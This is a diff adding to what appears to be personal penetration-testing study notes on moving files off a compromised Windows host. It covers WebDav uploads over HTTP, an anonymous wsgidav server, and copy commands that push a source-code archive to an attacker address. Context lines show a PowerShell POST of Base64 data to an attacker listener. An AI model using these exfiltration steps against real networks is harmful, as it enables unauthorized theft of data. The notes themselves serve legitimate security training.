@@ -63,3 +63,14 @@
 			- Use `Invoke-WebRequest -Uri http://<attack-ip>:8080/ -Method POST -Body $b64` to send a POST request with the file to the attacking machine.
 			- Catch the Base64 data using `nc -lvnp 8080`.
 			- Decode using `echo <base64> | base64 -d -w 0 > hosts`.
+	- ##### SMB Uploads
+		- Since companies usually allow outbound traffic using HTTP (TCP/80) and HTTPS (TCP/443) protocols and deny SMB (TCP/445) out of their internal network, SMB can be used over HTTP with `WebDav`.
+		- `WebDav` protocol enables a web server to behave like a file server, supporting collaborative content authoring, `WebDav` can also use HTTPS.
+		- When SMB is used, it will try to connect using the SMB protocol, if there is no SMB share available, it will try to connect using HTTP.
+		- **Configuring WebDav Server**
+			- Install necessary modules using `sudo pip3 install wsgidav cheroot`
+			- Starting the server using `sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous`.
+		- Connect to the share using the `DavWWWRoot` directory which is a special keyword recognized by the Windows Shell, no such folder exists on the WebDav server, `dir \\<attack-ip>\DavWWWRoot`, and to not use the keyword, specify a folder that exists on the server. For example `\<attack-ip>\sharefolder`.
+		- Copy the file using `copy C:\Users\john\Desktop\SourceCode.zip \\<attack-ip>\DavWWWRoot\` or `copy C:\Users\john\Desktop\SourceCoce.zip \\<attack-ip>\sharefolder\`.
+		- If there are no SMB (TCP/445) restrictions, `impacket-smbserver` the same way we set it up for download operations.
+	- ##### FTP Uploads
